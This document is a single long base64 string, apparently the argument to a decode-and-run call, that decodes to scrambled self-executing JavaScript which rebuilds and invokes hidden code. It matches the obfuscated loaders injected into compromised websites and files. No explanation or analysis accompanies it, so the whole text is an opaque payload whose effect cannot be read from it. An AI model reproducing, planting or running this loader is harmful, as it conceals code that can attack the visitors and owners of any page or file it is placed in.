hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
